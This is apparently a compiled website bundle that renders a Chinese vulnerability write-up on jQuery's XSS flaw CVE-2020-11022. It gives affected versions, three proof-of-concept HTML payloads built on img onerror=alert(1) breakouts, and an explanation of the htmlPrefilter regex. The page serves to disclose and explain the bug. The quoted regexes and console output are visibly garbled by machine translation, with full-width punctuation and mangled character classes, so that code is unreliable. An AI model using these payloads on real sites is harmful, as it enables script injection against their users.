{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[373],{1756:function(t,a,r){\"use strict\";r.r(a);var s=r(56),e=Object(s.a)({},(function(){var t=this,a=t.$createElement,s=t._self._c||a;return s(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[s(\"h1\",{attrs:{id:\"jquery-xss漏洞-cve-2020-11022\"}},[s(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#jquery-xss漏洞-cve-2020-11022\"}},[t._v(\"#\")]),t._v(\" jQuery XSS漏洞 CVE-2020-11022\")]),t._v(\" \"),s(\"h2\",{attrs:{id:\"漏洞描述\"}},[s(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[t._v(\"#\")]),t._v(\" 漏洞描述\")]),t._v(\" \"),s(\"p\",[t._v(\"据NVD描述：在大于或等于1.2且在3.5.0之前的jQuery版本中，即使执行了消毒（sanitize）处理，也仍会执行将来自不受信任来源的HTML传递给jQuery的DOM操作方法（即html()、.append()等），从而导致xss漏洞。\")]),t._v(\" \"),s(\"h2\",{attrs:{id:\"漏洞影响\"}},[s(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[t._v(\"#\")]),t._v(\" 漏洞影响\")]),t._v(\" \"),s(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"3.5.0 > jQuery >= 1.2\")]),s(\"br\"),t._v(\" \"),s(\"h2\",{attrs:{id:\"漏洞复现\"}},[s(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[t._v(\"#\")]),t._v(\" 漏洞复现\")]),t._v(\" \"),s(\"a-alert\",{attrs:{type:\"success\",message:\"在线复现地址， 可以通过观察变化了解漏洞, https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html\",description:\"\",showIcon:\"\"}}),t._v(\" \"),s(\"br\"),t._v(\" \"),s(\"div\",{staticClass:\"language-python extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-python\"}},[s(\"code\",[t._v(\"PoC \"),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1.\")]),t._v(\"\\n\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"style\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"style \"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"img src\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"x onerror\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"alert\"),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),t._v(\" \\n\\nPoC \"),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"2.\")]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),t._v(\"Only jQuery \"),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"3\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\".\")]),t._v(\"x affected\"),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\"\\n\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"img alt\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),s(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"<x\"')]),t._v(\" title\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),s(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"/><img src=x onerror=alert(1)>\"')]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),t._v(\"\\n\\nPoC \"),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"3.\")]),t._v(\"\\n\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"option\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"style\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"option\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"select\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"img src\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"x onerror\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"alert\"),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"style\"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),t._v(\"\\n\")])])]),s(\"p\",[s(\"img\",{attrs:{src:r(697),alt:\"img\"}})]),t._v(\" \"),s(\"p\",[t._v(\"PoC 1和PoC 2具有相同的根本原因。在中\"),s(\"code\",[t._v(\".html()\")]),t._v(\"，作为参数传递的HTML字符串将传递到 \"),s(\"a\",{attrs:{href:\"https://api.jquery.com/jQuery.htmlPrefilter/\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"$ .htmlPrefilter（）\"),s(\"OutboundLink\")],1),t._v(\"方法。该\"),s(\"code\",[t._v(\"htmlPrefilter\")]),t._v(\"处理用于替换自闭合标签等进行到，通过使用以下正则表达式：\"),s(\"code\",[t._v(\"<tagname **/>**``<tagname ></tagname>\")])]),t._v(\" \"),s(\"div\",{staticClass:\"language-plain extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[s(\"code\",[t._v(\"rxhtmlTag = / <（?! area | br | col | embed | hr | img | input | link | meta | param）（（[[ww：-] +）[^>] *）\\\\ /> / gi\\n[。 ..]\\nhtmlPrefilter：function（html）{\\n  return html.replace（rxhtmlTag，“ <$ 1> </ $ 2>”）;\\n}\\n\")])])]),s(\"p\",[t._v(\"如果PoC 1的HTML通过此替换，则输出将是：\")]),t._v(\" \"),s(\"div\",{staticClass:\"language-plain extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[s(\"code\",[t._v(\"> $ .htmlPrefilter（'<style> <style /> <img src = x onerror = alert（1）>'）\\n<“ <style> <style> </ style> <img src = x onerror = alert（1） >“\\n\")])])]),s(\"p\",[t._v(\"黄色部分是替换的字符串。由于此替换，\"),s(\"code\",[t._v(\"<style />\")]),t._v(\"样式元素内部被替换\"),s(\"code\",[t._v(\"<style ></style>\")]),t._v(\"为，结果是，之后的字符串从样式元素中被踢出。之后，\"),s(\"code\",[t._v(\".html()\")]),t._v(\"将替换的HTML分配给\"),s(\"code\",[t._v(\"innerHTML\")]),t._v(\"。在这里，\"),s(\"code\",[t._v(\"<img ...>\")]),t._v(\"字符串变成了实际的img标签，并触发了onerror事件。\")]),t._v(\" \"),s(\"p\",[t._v(\"顺便说一下，上述正则表达式在3.x之前的jQuery中使用。从3.x开始，使用了另一个经过稍加修改的正则表达式\")]),t._v(\" \"),s(\"div\",{staticClass:\"language-plain extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[s(\"code\",[t._v(\"rxhtmlTag = / <（?! area | br | col | embed | hr | img | input | link | meta | param）（（[[az] [^ \\\\ / \\\\ 0> \\\\ x20 \\\\ t \\\\ r \\\\ n \\\\ f] *）[^>] *）\\\\ /> / gi\\n\")])])]),s(\"p\",[t._v(\"此更改引入了另一个XSS向量，该向量可能仅由更多基本元素和属性导致XSS。通过此更改引入了PoC 2的向量。它仅适用于jQuery3.x。\")]),t._v(\" \"),s(\"div\",{staticClass:\"language-plain extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[s(\"code\",[t._v(\"> $ .htmlPrefilter（'<img alt =“ <x” title =“ /> <img src = x onerror = alert（1）>”>'）\\n<“ <img alt =” <x“ title =”> < / x“> <img src = x onerror = alert（1）>”>“\\n\")])])]),s(\"p\",[t._v(\"在这种情况下，属性值上的 img 字符串被踢出并发生XSS。\")])],1)}),[],!1,null,null,null);a.default=e.exports},697:function(t,a,r){t.exports=r.p+\"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313095322217.8f6d8421.png\"}}]);","extractedComments":[]}